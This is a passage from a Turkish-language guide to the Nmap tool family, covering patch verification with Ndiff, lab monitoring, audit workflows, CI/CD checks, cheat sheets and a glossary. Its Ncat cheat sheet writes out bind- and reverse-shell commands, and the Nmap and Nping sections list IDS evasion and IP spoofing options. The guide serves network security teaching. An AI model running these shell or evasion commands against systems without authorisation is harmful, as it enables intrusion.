    ndiff firewall_oncesi.xml firewall_sonrasi.xml
    ```
**Analiz:** Ndiff çıktısında, ilgili portun durumunun `open`'dan `filtered` veya `closed`'a değiştiğini görmelisiniz. Eğer port hala `open` ise, firewall kuralı doğru uygulanmamış veya etkili olmamış demektir.

#### Senaryo 4: Bir Zafiyet Taraması Sonrası Uygulanan Yamaların Etkinliğini Ndiff ile Teyit Etmek

**Amaç:** Bir sistemde Nmap'in `vuln` veya `vulners` NSE scriptleriyle bir zafiyet tespit edildikten sonra, ilgili yama uygulandığında zafiyetin giderilip giderilmediğini (veya zafiyetli servisin versiyonunun değişip değişmediğini) Ndiff ile kontrol etmek.
**Adımlar:**
1.  **Yama Öncesi Zafiyet Taraması (`zafiyetli_durum.xml`):**
    ```bash
    sudo nmap -sV --script=vuln,vulners -oX zafiyetli_durum.xml <hedef_sunucu>
    ```
    Bu taramada belirli bir zafiyetin raporlandığını varsayalım.
2.  **Yamayı Uygulayın:** Tespit edilen zafiyet için gerekli yamayı veya yapılandırma değişikliğini uygulayın.
3.  **Yama Sonrası Zafiyet Taraması (`yamali_durum.xml`):**
    ```bash
    sudo nmap -sV --script=vuln,vulners -oX yamali_durum.xml <hedef_sunucu>
    ```
4.  **Ndiff ile Karşılaştırma:**
    ```bash
    ndiff zafiyetli_durum.xml yamali_durum.xml
    ```
**Analiz:** Ndiff çıktısında, daha önce raporlanan zafiyetin artık görünmemesi veya zafiyetli servisin versiyonunun güvenli bir versiyona yükseltilmiş olması beklenir. Eğer zafiyet hala raporlanıyorsa, yama düzgün uygulanmamış veya etkisiz kalmış olabilir.

---

## 7. Karışık Örnek Senaryolar ve Entegre Kullanım

Bu bölümde, Nmap, Ncat, Nping ve Ndiff araçlarının bir arada veya birbirini tamamlayacak şekilde kullanıldığı daha karmaşık ve gerçek dünya problemlerine odaklanan senaryolar bulacaksınız.

### 7.1 Kapsamlı Keşif ve İzleme (Eğitim Laboratuvarı Örneği)

**Amaç:** Sanal bir eğitim laboratuvarı ağındaki tüm aktif cihazları periyodik olarak tarayarak envanter oluşturmak, açık portları ve servisleri belirlemek, zaman içindeki değişiklikleri Ndiff ile takip etmek ve şüpheli servislere Ncat ile manuel olarak bağlanıp incelemek.

**Adımlar:**

1.  **Periyodik Tam Kapsamlı Nmap Taraması (Haftalık):**
    Laboratuvar ağındaki tüm IP aralığını hedef alarak detaylı bir tarama yapın.
    ```bash
    # lab_ag_tarama_YYYY-MM-DD.xml olarak kaydedilecek
    LAB_NETWORK="192.168.56.0/24" # Kendi laboratuvar ağınızla değiştirin
    SCAN_DATE=$(date +%Y-%m-%d)
    sudo nmap -sS -sV -O -A -T4 -p- --reason \
             -oX lab_ag_tarama_${SCAN_DATE}.xml \
             $LAB_NETWORK
    echo "Haftalık laboratuvar ağı taraması tamamlandı: lab_ag_tarama_${SCAN_DATE}.xml"
    ```
    *   `-sS -sV -O -A`: SYN scan, versiyon tespiti, OS tespiti ve agresif seçenekler (NSE default scriptleri, traceroute vb. içerir).
    *   `-p-`: Tüm portları tara.
    *   Bu tarama uzun sürebilir.

2.  **Değişiklik Takibi (Ndiff):**
    Bir önceki haftanın tarama sonucuyla (`onceki_hafta.xml`) mevcut tarama sonucunu (`bu_hafta.xml`) karşılaştırın.
    ```bash
    # Önceki haftanın dosya adını belirleyin
    PREVIOUS_SCAN_DATE=$(date -d "7 days ago" +%Y-%m-%d)
    PREVIOUS_SCAN_FILE="lab_ag_tarama_${PREVIOUS_SCAN_DATE}.xml"
    CURRENT_SCAN_FILE="lab_ag_tarama_${SCAN_DATE}.xml"

    if [ -f "$PREVIOUS_SCAN_FILE" ]; then
      echo "Ndiff ile değişiklikler analiz ediliyor..."
      ndiff $PREVIOUS_SCAN_FILE $CURRENT_SCAN_FILE > lab_ag_farklar_${SCAN_DATE}.txt
      echo "Fark raporu oluşturuldu: lab_ag_farklar_${SCAN_DATE}.txt"
      # Fark raporunu inceleyin veya e-posta ile gönderin
      if [ -s "lab_ag_farklar_${SCAN_DATE}.txt" ]; then
        cat lab_ag_farklar_${SCAN_DATE}.txt
        # mail -s "Lab Ağı Değişiklik Raporu" admin@lab.local < lab_ag_farklar_${SCAN_DATE}.txt
      fi
    else
      echo "Karşılaştırılacak önceki hafta taraması bulunamadı."
    fi
    ```

3.  **Şüpheli veya Bilinmeyen Servislere Ncat ile Manuel Bağlantı:**
    Nmap raporunda veya Ndiff fark raporunda beklenmedik bir açık port veya bilinmeyen bir servis (özellikle yüksek port numaralarında) görürseniz, Ncat ile bağlanıp banner'ını almaya veya basit komutlar göndermeye çalışın.
    Örnek: `192.168.56.102` IP'sinde TCP port `7777`'nin yeni açıldığını gördünüz.
    ```bash
    echo "QUIT" | ncat 192.168.56.102 7777
    # Veya sadece bağlanıp ne olacağını bekleyin:
    # ncat -v 192.168.56.102 7777
    ```
    Gelen yanıtı (varsa) inceleyin.

4.  **Belirli Bir Servisin Yanıt Süresini veya Davranışını Nping ile Test Etme:**
    Eğer bir servisin (örn: özel bir web uygulaması) yavaşladığından şüpheleniyorsanız veya belirli paket türlerine nasıl tepki verdiğini görmek istiyorsanız Nping kullanabilirsiniz.
    Örnek: `192.168.56.105`'teki bir web sunucusunun 80. portuna TCP ping ile RTT ölçümü:
    ```bash
    nping --tcp -p 80 -c 10 192.168.56.105
    ```

**Bu entegre yaklaşım, laboratuvar ağınızın kapsamlı bir görünümünü elde etmenizi, değişiklikleri proaktif olarak izlemenizi ve potansiyel sorunları daha derinlemesine araştırmanızı sağlar.**

### 7.2 Kapsamlı Güvenlik Denetimi Akışı

**Amaç:** Bir kuruluşun ağ altyapısının genel bir güvenlik denetimini yapmak.

**Aşamalar:**

1.  **Aşama 1: Dış Keşif (Blackbox Bakış Açısı)**
    *   **Hedef Belirleme:** Kuruluşun dışa açık IP adreslerini, alan adlarını ve alt alan adlarını belirleyin (OSINT, DNS sorguları, `dns-brute` NSE scripti vb.).
    *   **Dış Nmap Taraması:**
        ```bash
        sudo nmap -sS -sV -Pn -T4 --top-ports 1000 \
                 --script=banner,http-title,ssl-enum-ciphers,dns-brute,vulners \
                 -oA dis_kesif_raporu <hedef_domainler_ve_ipler>
        ```
        *   `-Pn`: Ping'i atla (dışarıdan ICMP engellenebilir).
        *   `--top-ports 1000`: En popüler 1000 portu tara.
        *   İlgili NSE scriptlerini kullan.

2.  **Aşama 2: İç Ağ Keşfi (Graybox/Whitebox Bakış Açısı - İzinle!)**
    *   **Geniş Ağ Taraması (Host Keşfi):**
        ```bash
        sudo nmap -sn -T4 -oG - 10.0.0.0/8 | grep "Status: Up" | awk '{print $2}' > ic_canli_hostlar.txt
        ```
    *   **Canlı Hostlarda Detaylı Port/Servis/OS/Zafiyet Taraması:**
        Bu, segmentlere ayrılarak veya daha küçük gruplar halinde yapılabilir.
        ```bash
        sudo nmap -sS -sV -O -A -T4 \
                 --script=default,vuln,smb-enum*,rdp-enum-encryption \
                 -iL ic_canli_hostlar.txt -oA ic_detayli_rapor_segment1
        ```
        *   `smb-enum*`: SMB paylaşımlarını, kullanıcılarını vb. listeler.
        *   Diğer ilgili NSE scriptleri eklenebilir.

3.  **Aşama 3: Manuel Doğrulama ve Derinlemesine Analiz**
    *   **Ncat ile Servis Etkileşimi:** Nmap raporlarında ilginç bulunan veya zafiyetli olabilecek servislere Ncat ile bağlanarak manuel testler yapın (banner grabbing, basit komutlar gönderme).
        Örnek: Bilinmeyen bir servise bağlanma:
        ```bash
        ncat -v <hedef_ip> <port>
        ```
    *   **Nping ile Firewall/Ağ Cihazı Testleri:** Belirli portlara veya protokollere yönelik özel paketler göndererek güvenlik duvarı kurallarını veya ağ cihazlarının davranışlarını test edin.
        Örnek: Belirli bir porta TCP ACK paketi gönderme:
        ```bash
        sudo nping --tcp -p <port> --flags A -c 3 <hedef_ip>
        ```

4.  **Aşama 4: Raporlama ve Takip**
    *   Tüm Nmap XML çıktılarını toplayın.
    *   Gerekirse, önceki denetimlerle karşılaştırmak için Ndiff kullanın.
    *   Bulguları (açık portlar, zafiyetler, yanlış yapılandırmalar) risk seviyelerine göre önceliklendirin ve detaylı bir rapor oluşturun.
    *   Düzeltici eylemler için öneriler sunun ve takip edin.

**Bu akış, bir ağın hem dışarıdan hem de içeriden nasıl göründüğüne dair kapsamlı bir resim sunar ve potansiyel güvenlik risklerini ortaya çıkarır.**

### 7.3 DevOps ve Otomasyon Entegrasyonu

**Amaç:** Nmap araçlarını CI/CD (Sürekli Entegrasyon/Sürekli Dağıtım) pipeline'larına entegre ederek, yeni yazılım sürümleri veya altyapı değişiklikleri dağıtıldıktan sonra otomatik güvenlik ve yapılandırma kontrolleri yapmak.

**Senaryo: Bir Web Uygulaması Deployment'ı Sonrası Kontroller**

1.  **Pipeline Adımı: Uygulama Deploy Edilir.**
    Yeni web uygulaması sürümü bir sunucuya (veya container'a) deploy edilir.

2.  **Pipeline Adımı: Temel Port ve Servis Kontrolü (Nmap)**
    Bir script (örn: Python veya Bash) aracılığıyla, uygulamanın beklenen portlarda (örn: 80, 443) çalıştığını ve temel HTTP yanıtını verdiğini Nmap ile kontrol edin.
    ```python
    # Python'da python-nmap ile örnek
    import nmap
    nm = nmap.PortScanner()
    target_host = "app.example.com"
    expected_ports = {'80/tcp': 'http', '443/tcp': 'https'}
    scan_args = '-sT -p 80,443' # Basit connect scan

    nm.scan(hosts=target_host, arguments=scan_args)
    if target_host not in nm.all_hosts() or nm[target_host].state() != 'up':
        print(f"HATA: {target_host} ulaşılamıyor!")
        exit(1) # Pipeline'ı başarısız yap

    for port_proto, service_name in expected_ports.items():
        port, proto = port_proto.split('/')
        port = int(port)
        if port not in nm[target_host][proto] or nm[target_host][proto][port]['state'] != 'open':
            print(f"HATA: Port {port}/{proto} ({service_name}) açık değil!")
            exit(1)
        # print(f"Port {port}/{proto} ({service_name}) açık.")
    print("Temel port kontrolleri başarılı.")
    ```

3.  **Pipeline Adımı: Uygulama Sağlık Kontrolü (Ncat)**
    Uygulamanın `/health` veya ana sayfasına Ncat ile basit bir HTTP isteği gönderip `200 OK` yanıtı alıp almadığını kontrol edin.
    ```bash
    # Bash script içinde
    HEALTH_CHECK_URL="app.example.com"
    HEALTH_CHECK_PORT="80" # veya 443 (o zaman ncat --ssl gerekir)

    # Basit GET isteği
    HTTP_RESPONSE=$(echo -e "GET / HTTP/1.0\r\nHost: ${HEALTH_CHECK_URL}\r\nConnection: close\r\n\r\n" | ncat -w 5 $HEALTH_CHECK_URL $HEALTH_CHECK_PORT | head -n 1)

    if [[ "$HTTP_RESPONSE" == *"HTTP/1.1 200 OK"* ]] || [[ "$HTTP_RESPONSE" == *"HTTP/1.0 200 OK"* ]]; then
      echo "Uygulama sağlık kontrolü başarılı: $HTTP_RESPONSE"
    else
      echo "HATA: Uygulama sağlık kontrolü başarısız: $HTTP_RESPONSE"
      exit 1 # Pipeline'ı başarısız yap
    fi
    ```

4.  **Pipeline Adımı: Yapılandırma Değişikliği Kontrolü (Nmap + Ndiff - Opsiyonel)**
    Eğer altyapıda önemli bir değişiklik yapıldıysa, deployment öncesi ve sonrası Nmap taramaları (örn: `-sV --script=http-headers,ssl-enum-ciphers`) yapılıp Ndiff ile karşılaştırılabilir. Beklenmedik değişiklikler (örn: SSL zafiyeti, bilgi sızdıran başlıklar) varsa pipeline uyarısı veya hatası üretebilir.

**Bu entegrasyon, hatalı deployment'ları erken aşamada yakalamaya, güvenlik açıklarının üretim ortamına sızmasını engellemeye ve "güvenliği sola kaydırma" (shift left security) prensibini uygulamaya yardımcı olur.**

---

## 8. Cheatsheet (Hızlı Komutlar)

Bu bölüm, Nmap, Ncat, Nping ve Ndiff araçları için en sık kullanılan komutları ve seçenekleri hızlı bir referans olarak sunar.

### 8.1 Nmap Cheatsheet

**Hedef Belirtme:**
*   `nmap <ip_veya_host>`: Tek hedef.
*   `nmap <ağ/CIDR>`: Ağ aralığı (örn: `192.168.1.0/24`).
*   `nmap <ip1,ip2,host3>`: Birden fazla hedef.
*   `nmap -iL hedefler.txt`: Dosyadan hedef listesi.
*   `nmap --exclude <ip_veya_host>`: Hedefi hariç tut.

**Tarama Teknikleri:**
*   `-sS`: TCP SYN Scan (varsayılan, root/admin gerekir).
*   `-sT`: TCP Connect Scan.
*   `-sU`: UDP Scan (genellikle `-sV` ile).
*   `-sn`: Ping Scan (host keşfi, port taraması yok).
*   `-Pn`: Ping'i atla, tüm hedefleri canlı kabul et.

**Port Seçenekleri:**
*   `-p <port_listesi>`: Belirli portlar (örn: `-p 22,80,443` veya `-p 1-100`).
*   `-p-`: Tüm 65535 portu tara.
*   `-F`: Hızlı tarama (en popüler 100 port).
*   `--top-ports <sayı>`: En popüler N portu tara.

**Servis ve OS Tespiti:**
*   `-sV`: Servis versiyonlarını tespit et.
*   `--version-intensity <0-9>`: Versiyon tespit yoğunluğu.
*   `-O`: İşletim sistemini tahmin et.
*   `-A`: Agresif seçenekler (OS tespiti, versiyon tespiti, script taraması, traceroute içerir).

**NSE (Nmap Scripting Engine):**
*   `-sC` veya `--script=default`: Varsayılan güvenli scriptleri çalıştır.
*   `--script <script_adı_veya_kategori>`: Belirli scriptleri/kategoriyi çalıştır (örn: `--script=vuln`).
*   `--script-args <arg=değer,...>`: Scripte argüman ver.
*   `nmap --script-updatedb`: Script veritabanını güncelle.

**Zamanlama ve Performans:**
*   `-T<0-5>`: Zamanlama şablonu (T0-Paranoid, T3-Normal, T4-Aggressive, T5-Insane).
*   `--host-timeout <süre>`: Host başına maksimum tarama süresi.
*   `--min-rate <sayı>`: Saniyede minimum paket.

**Firewall/IDS Atlatma:**
*   `-f` veya `--mtu <değer>`: Paket parçalama.
*   `-D <sahte_ip1,ME,RND:3,...>`: Decoy (sahte kaynak IP) kullan.
*   `-g <port>` veya `--source-port <port>`: Kaynak portu belirle.
*   `-sI <zombi_host>`: Idle Scan.

**Çıktı Formatları:**
*   `-oN <dosya.nmap>`: Normal çıktı.
*   `-oX <dosya.xml>`: XML çıktı.
*   `-oG <dosya.gnmap>`: Grep'lenebilir çıktı.
*   `-oA <dosya_öneki>`: Tüm ana formatlarda çıktı.
*   `-v` / `-vv`: Ayrıntı seviyesi.
*   `--reason`: Port durumunun nedenini göster.
*   `--open`: Sadece açık portları göster.

### 8.2 Ncat Cheatsheet

**Dinleme (Sunucu Modu):**
*   `ncat -lp <port>`: Belirtilen TCP portunda dinle.
*   `ncat -ulp <port>`: Belirtilen UDP portunda dinle.
*   `ncat -klp <port>`: Bağlantı sonrası dinlemeye devam et.
*   `ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lp <port>`: SSL ile dinle.

**Bağlanma (İstemci Modu):**
*   `ncat <hedef_ip> <port>`: TCP ile bağlan.
*   `ncat -u <hedef_ip> <port>`: UDP ile bağlan.
*   `ncat --ssl <hedef_ip> <port>`: SSL ile bağlan.

**Dosya Transferi:**
*   Gönderici: `ncat <alıcı_ip> <port> < dosya.txt`
*   Alıcı: `ncat -lp <port> > alinan_dosya.dat`

**Shell Bağlantıları (DİKKATLİ KULLANIN!):**
*   Bind Shell (Kurban dinler): `ncat -lp <port> -e /bin/bash` (Linux) veya `-e cmd.exe` (Windows)
*   Reverse Shell (Saldırgan dinler, Kurban bağlanır):
    *   Saldırgan: `ncat -lp <port>`
    *   Kurban: `ncat <saldırgan_ip> <port> -e /bin/bash` (veya `cmd.exe`)

**Diğer Seçenekler:**
*   `-v` / `-vv`: Ayrıntılı çıktı.
*   `-w <saniye>`: Bağlantı zaman aşımı.
*   `-c <komut>` veya `--sh-exec <komut>`: Bağlantı kurulduğunda komut çalıştır (port yönlendirme vb.).
*   `--proxy <proxy_ip:port> --proxy-type <http|socks4|socks5>`: Proxy üzerinden bağlan.
*   `--allow <ip_listesi>`, `--deny <ip_listesi>`: Dinleme modunda erişim kontrolü.

### 8.3 Nping Cheatsheet

**Protokol Seçimi (Genellikle root/admin gerekir):**
*   `nping --icmp <hedef>`: ICMP Echo (varsayılan ICMP modu).
*   `nping --tcp -p <port> <hedef>`: TCP Ping (varsayılan mod, port belirtilmeli).
*   `nping --udp -p <port> <hedef>`: UDP Ping.
*   `nping --arp <hedef_lokal_ip>`: ARP Ping (lokal ağ).

**Temel Seçenekler:**
*   `-c <sayı>`: Gönderilecek paket sayısı.
*   `--rate <saniyede_paket>`: Gönderim hızı.
*   `--delay <süre>`: Paketler arası gecikme.
*   `-p <port>` veya `--dest-port <port>`: Hedef port (TCP/UDP).
*   `-g <port>` veya `--source-port <port>`: Kaynak port.

**Paket Özelleştirme:**
*   `--ttl <değer>`: IP Time To Live.
*   `--tos <değer>`: IP Type of Service.
*   `--id <değer>`: IP ID.
*   `--flags <S,A,F,R,P,U,...>`: TCP bayrakları.
*   `--seq <numara>`, `--ack <numara>`: TCP sıra/onay numaraları.
*   `--win <boyut>`: TCP pencere boyutu.
*   `--data <hex_string>`: Hex veri ekle.
*   `--data-string <string>`: Metin veri ekle.
*   `--data-length <uzunluk>`: Belirtilen uzunlukta rastgele veri ekle.

**Echo Modu:**
*   `nping --echo-server "şifre" [--udp|--tcp] -p <port> -e <arayüz>`
*   `nping --echo-client "şifre" <sunucu_ip> [--udp|--tcp] --dest-ip <nihai_hedef> [diğer_paket_parametreleri]`

**Diğer:**
*   `-v` / `-vv` / `-vvv`: Ayrıntı seviyesi.
*   `-S <kaynak_ip>`: Kaynak IP sahteciliği (dikkatli kullanın!).
*   `--df`: Don't Fragment bayrağı.

### 8.4 Ndiff Cheatsheet

*   `ndiff <scan1.xml> <scan2.xml>`: İki Nmap XML dosyasını karşılaştırır.
*   `ndiff -v <scan1.xml> <scan2.xml>`: Ayrıntılı çıktı (değişmeyenleri de gösterir).
*   `ndiff --xml <scan1.xml> <scan2.xml>`: Farkları XML formatında çıktı verir.

---

## 9. Ek Bilgiler ve Kaynaklar

### 9.1 İlgili RFC'ler ve Standartlar

Nmap araç ailesinin kullandığı ağ protokollerinin ve tekniklerinin temelini oluşturan bazı önemli RFC (Request for Comments) dokümanları:

*   **TCP (Transmission Control Protocol):** RFC 793, RFC 9293
*   **IP (Internet Protocol):** RFC 791
*   **ICMP (Internet Control Message Protocol):** RFC 792
*   **UDP (User Datagram Protocol):** RFC 768
*   **ARP (Address Resolution Protocol):** RFC 826
*   **DNS (Domain Name System):** RFC 1034, RFC 1035
*   **HTTP (Hypertext Transfer Protocol):** RFC 2616 (HTTP/1.1), RFC 7230-7235 (HTTP/1.1 güncellemeleri), RFC 7540 (HTTP/2)
*   **SSL/TLS (Secure Sockets Layer / Transport Layer Security):** RFC 8446 (TLS 1.3), RFC 5246 (TLS 1.2)

### 9.2 Alternatif Araçlar

Nmap araç ailesinin yaptığı işlere benzer veya tamamlayıcı işlevler sunan bazı alternatif araçlar:

*   **Port Tarama ve Ağ Keşfi:**
    *   **Masscan:** Çok büyük ağlarda çok hızlı asenkron port taraması yapmak için tasarlanmıştır. Nmap kadar detaylı servis tespiti yapmaz ama hız konusunda üstündür.
    *   **Unicornscan:** Asenkron port tarayıcı, özellikle UDP taramasında etkilidir.
    *   **RustScan:** Hızlı port tarayıcı, Nmap scriptlerini de entegre edebilir.
*   **Paket Oluşturma ve Analiz:**
    *   **hping3:** Nping'e benzer, gelişmiş paket oluşturma ve analiz aracı. Daha fazla protokol ve seçenek sunabilir.
    *   **Scapy:** Python tabanlı, çok güçlü ve esnek bir paket oluşturma, gönderme, yakalama ve analiz kütüphanesidir. Neredeyse her türlü paketi oluşturabilirsiniz.
    *   **PackETH:** Ethernet paketleri oluşturmak için bir GUI aracıdır.
*   **Netcat Alternatifleri:**
    *   **Socat:** Ncat'e göre daha karmaşık ve güçlü bir ağ aracıdır. Çift yönlü veri akışları, çeşitli protokoller ve adres türleri arasında bağlantılar kurabilir.
    *   **Orijinal Netcat (`nc`):** Birçok sistemde hala bulunur, temel işlevleri sunar.
*   **Paket Yakalama ve Analiz:**
    *   **Wireshark:** En popüler ağ protokol analiz aracıdır. GUI arayüzü ile detaylı paket incelemesi sunar.
    *   **tcpdump:** Komut satırı tabanlı güçlü bir paket yakalama aracıdır.
*   **Web Uygulama Taraması:**
    *   **Nikto:** Web sunucularında bilinen zafiyetleri ve yanlış yapılandırmaları tarar.
    *   **OWASP ZAP (Zed Attack Proxy):** Kapsamlı bir web uygulama güvenlik test aracıdır.
    *   **Burp Suite:** Profesyonel web uygulama güvenlik test platformudur.

### 9.3 Önerilen Kaynaklar (Kitap, Blog, Video)

*   **Kitaplar:**
    *   **"Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning"** - Gordon "Fyodor" Lyon (Nmap'in yaratıcısı). Nmap hakkında en kapsamlı ve yetkili kaynaktır.
    *   **"Practical Packet Analysis"** - Chris Sanders. Wireshark kullanarak ağ trafiğini anlamak için harika bir başlangıç.
    *   **"The Web Application Hacker's Handbook"** - Dafydd Stuttard, Marcus Pinto. Web uygulama güvenliği için temel bir kaynak.
*   **Web Siteleri ve Bloglar:**
    *   **Nmap Resmi Web Sitesi ([https://nmap.org](https://nmap.org)):** Dokümantasyon, indirmeler, NSE scriptleri ve en son haberler.
    *   **Insecure.org ([https://insecure.org](https://insecure.org)):** Nmap ile ilgili makaleler ve Fyodor'un yazıları.
    *   **SANS Enstitüsü ([https://www.sans.org](https://www.sans.org)):** Siber güvenlik eğitimleri, webcast'leri ve kaynakları.
    *   **Daniel Miessler ([https://danielmiessler.com](https://danielmiessler.com)):** Siber güvenlik, teknoloji ve felsefe üzerine düşündürücü yazılar.
    *   **Dark Reading ([https://www.darkreading.com](https://www.darkreading.com)):** Siber güvenlik haberleri ve analizleri.
*   **Online Eğitim Platformları ve Laboratuvarlar:**
    *   **TryHackMe ([https://tryhackme.com](https://tryhackme.com)):** Başlangıç ve orta seviye için pratik siber güvenlik odaları. Nmap ve diğer araçları uygulamalı öğrenmek için ideal.
    *   **Hack The Box ([https://www.hackthebox.com](https://www.hackthebox.com)):** Daha zorlu, sızma testi odaklı sanal makineler.
    *   **PentesterLab ([https://pentesterlab.com](https://pentesterlab.com)):** Çeşitli web ve sistem zafiyetlerini öğrenmek için laboratuvarlar.
    *   **Cybrary ([https://www.cybrary.it](https://www.cybrary.it)):** Ücretsiz ve ücretli siber güvenlik kursları.
*   **YouTube Kanalları (İngilizce):**
    *   **The Cyber Mentor (Heath Adams):** Pratik etik hacking ve pentest eğitimleri.
    *   **IppSec:** Hack The Box makinelerinin çözüm videoları (ileri seviye).
    *   **Hak5:** Çeşitli siber güvenlik araçları ve teknikleri üzerine programlar.
    *   **Professor Messer:** CompTIA sertifikasyonları (A+, Network+, Security+) için ücretsiz eğitim videoları (temel ağ ve güvenlik kavramları için iyi).
    *   **LiveOverflow:** Tersine mühendislik, exploit geliştirme ve CTF çözümleri üzerine derinlemesine teknik videolar.

### 9.4 Glosary / Terimler Sözlüğü

*   **ARP (Address Resolution Protocol):** Lokal ağda bir IP adresini bir MAC (fiziksel) adrese çözümlemek için kullanılan protokol.
*   **Banner Grabbing:** Bir servise bağlanıp, servisin kendisi hakkında gönderdiği ilk bilgiyi (banner) yakalama işlemi. Genellikle servis adı ve versiyonu hakkında ipucu verir.
*   **Bind Shell:** Kurban makinede bir port açarak dinlemeye başlayan ve saldırganın bu porta bağlanarak komut satırı erişimi elde ettiği bir shell türü.
*   **CIDR (Classless Inter-Domain Routing):** IP adreslerini ve yönlendirme öneklerini belirtmek için kullanılan bir notasyon (örn: `192.168.1.0/24`).
*   **CPE (Common Platform Enumeration):** Bilgi teknolojisi sistemlerini, yazılımlarını ve paketlerini benzersiz bir şekilde tanımlamak için standartlaşmış bir adlandırma şeması. Nmap, OS ve servis tespiti için CPE kullanır.
*   **CVE (Common Vulnerabilities and Exposures):** Kamuoyuna açıklanmış siber güvenlik açıkları için standart bir tanımlayıcı numaralandırma sistemi.
*   **Firewall (Güvenlik Duvarı):** Ağ trafiğini önceden tanımlanmış güvenlik kurallarına göre filtreleyen bir ağ güvenlik sistemi.
*   **Host Discovery (Ana Bilgisayar Keşfi):** Bir ağdaki hangi ana bilgisayarların (host) aktif ve çevrimiçi olduğunu belirleme süreci.
*   **ICMP (Internet Control Message Protocol):** Ağ cihazları arasında hata mesajları ve operasyonel bilgiler (örn: ping) göndermek için kullanılan bir ağ katmanı protokolü.
*   **IDS/IPS (Intrusion Detection System / Intrusion Prevention System):** Saldırı Tespit Sistemi / Saldırı Önleme Sistemi. Ağdaki veya sistemdeki kötü amaçlı aktiviteleri veya politika ihlallerini tespit etmeye (IDS) veya engellemeye (IPS) çalışan sistemler.
*   **IP Spoofing (IP Sahteciliği):** Bir IP paketinin kaynak IP adresini, paketin gerçek göndericisinden farklı bir adresle değiştirmesi işlemi.
*   **Lua:** Hafif, çok paradigmalı bir programlama dili. Nmap Scripting Engine (NSE) tarafından kullanılır.
*   **MAC Address (Media Access Control Address):** Bir ağ arayüz kartına (NIC) atanmış benzersiz bir donanım tanımlayıcısı.
*   **NSE (Nmap Scripting Engine):** Nmap'in yeteneklerini Lua scriptleri aracılığıyla genişletmesini sağlayan güçlü bir özelliği.
*   **OS Fingerprinting (İşletim Sistemi Parmak İzi):** Bir ana bilgisayarın işletim sistemini, ağ trafiğindeki davranışlarını analiz ederek tahmin etme süreci.
*   **Payload (Veri Yükü):** Bir ağ paketinde veya bir exploitte, asıl veriyi veya zararlı kodu taşıyan kısım.
*   **Port:** Bir ana bilgisayarda belirli bir uygulama veya servise gelen/giden ağ trafiğinin sanal bir uç noktası.
*   **Port Scan (Port Tarama):** Bir ana bilgisayardaki hangi portların açık, kapalı veya filtrelenmiş olduğunu belirlemek için yapılan işlem.
*   **Reverse Shell:** Saldırgan makinede bir port dinlenirken, kurban makinenin bu porta bağlanarak komut satırı erişimini saldırgana sunduğu bir shell türü. Genellikle güvenlik duvarlarını aşmak için kullanılır.
*   **RFC (Request for Comments):** İnternet standartlarını, protokollerini ve en iyi uygulamalarını tanımlayan dokümanlar serisi.
*   **Root/Administrator Yetkisi:** Bir işletim sisteminde en üst düzey ayrıcalıklara sahip olma durumu. Bazı Nmap taramaları (örn: SYN scan, OS tespiti) bu yetkileri gerektirir.
*   **RTT (Round Trip Time):** Bir paketin bir kaynaktan bir hedefe gidip geri dönmesi için geçen süre. Ağ gecikmesinin bir ölçüsüdür.
*   **Service Discovery/Enumeration (Servis Keşfi/Listeleme):** Bir ana bilgisayardaki açık portlarda hangi servislerin (örn: HTTP, FTP, SSH) çalıştığını ve bu servislerin versiyonlarını belirleme süreci.
*   **SSL/TLS (Secure Sockets Layer / Transport Layer Security):** Ağ üzerinden güvenli iletişim sağlamak için kullanılan kriptografik protokoller.
*   **TCP (Transmission Control Protocol):** Güvenilir, bağlantı odaklı bir taşıma katmanı protokolü.
*   **UDP (User Datagram Protocol):** Bağlantısız, güvenilir olmayan bir taşıma katmanı protokolü. Hızlıdır ancak veri kaybı olabilir.
*   **Vulnerability (Zafiyet/Güvenlik Açığı):** Bir sistemde veya uygulamada, bir saldırgan tarafından istismar edilebilecek bir zayıflık.
*   **XML (Extensible Markup Language):** Verileri yapılandırılmış bir şekilde depolamak ve taşımak için kullanılan bir işaretleme dili. Nmap, `-oX` seçeneğiyle XML formatında çıktı üretebilir.

### 9.5 Katkıda Bulunma

Bu rehberin daha da gelişmesine ve zenginleşmesine yardımcı olmak isterseniz, katkılarınızı bekliyoruz! GitHub üzerinden (eğer bu bir GitHub projesi ise) Pull Request gönderebilir, hata bildiriminde bulunabilir veya yeni senaryo önerileri sunabilirsiniz. Lütfen katkı kurallarını (genellikle `CONTRIBUTING.md` dosyasında bulunur) inceleyin.

---

Umarım bu kapsamlı rehber, Nmap araç ailesini etkili bir şekilde kullanmanızda size yardımcı olur. Unutmayın, bu araçlar çok güçlüdür ve büyük sorumluluk gerektirir. **Her zaman yasal ve etik sınırlar içinde kullanın!**
